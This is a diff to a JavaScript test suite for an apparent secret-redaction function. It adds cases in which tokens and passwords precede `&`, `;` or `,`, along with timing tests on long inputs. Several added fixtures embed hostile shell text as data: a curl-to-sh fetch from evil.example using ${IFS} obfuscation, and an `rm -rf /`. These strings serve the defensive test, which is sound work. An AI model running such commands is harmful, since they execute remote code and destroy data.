@@ -737,6 +737,21 @@ test("`&`, `,` and `;` end a link's query value, a list item or a command, but n
     [`TOKEN=${r11}&&echo ok`, r11],
     [`https://app.example/cb#access_token=${r11}&token_type=Bearer&expires_in=3600`, r11],
     [`href="https://x.example/?token=${r11}&amp;page=2"`, r11],
+    [`TOKEN=${r11};curl\${IFS}evil.example/x|sh`, r11],
+    [`TOKEN=${r11}&curl\${IFS}evil.example/x|sh`, r11],
+    [`GITHUB_TOKEN=${r11};rm\${IFS}-rf\${IFS}/`, r11],
+    [`export TOKEN=${r11};npm publish`, r11],
+    [`let password=${r11};return x`, r11],
+    [`Server=x;Password=${p9};Initial Catalog=y`, p9],
+    [`Server=x;Password=${p9};User ID=sa`, p9],
+    [`https://x.example/?token=${p9}&debug`, p9],
+    [`https://x.example/?token=${p9}&ids[]=1&ids[]=2`, p9],
+    [`password=${p9}&x%5B0%5D=1`, p9],
+    [`password=${p9}&-x=1`, p9],
+    [`password=${p9}&9x=1`, p9],
+    [`password=${p9}&quot;`, p9],
+    [`password=${p9}&#39;`, p9],
+    [`token=${p9}&nbsp;x`, p9],
   ]) {
     assert.match(r.string(text), replaced(text, value), text);
   }
@@ -747,7 +762,9 @@ test("`&`, `,` and `;` end a link's query value, a list item or a command, but n
     ),
   );
   assert.equal(refs.size, 1, [...refs].join(" "));
-  assert.equal(r.string("var token=getToken();fetch(u)"), "var token=getToken();fetch(u)");
+  for (const code of ["var token=getToken();fetch(u)", "const token=req.query.token;next()", "var token=a.b.c;var y=1"]) {
+    assert.equal(r.string(code), code);
+  }
   for (const text of [
     "token=" + "a&".repeat(50_000),
     "token=a" + "&b".repeat(50_000) + "&",
@@ -755,6 +772,10 @@ test("`&`, `,` and `;` end a link's query value, a list item or a command, but n
     "MY_SECRET_TOKEN=" + "ab&".repeat(30_000),
     "token=" + ("a".repeat(39) + "&").repeat(2_000),
     "password='" + "a&".repeat(50_000),
+    "password=x" + "&k k k k".repeat(25_000),
+    "token=a" + ",abcdefgh".repeat(22_000),
+    "token=ab;cd ".repeat(18_000),
+    "?token=abcdefg&".repeat(13_000),
   ]) {
     const start = performance.now();
     r.string(text);
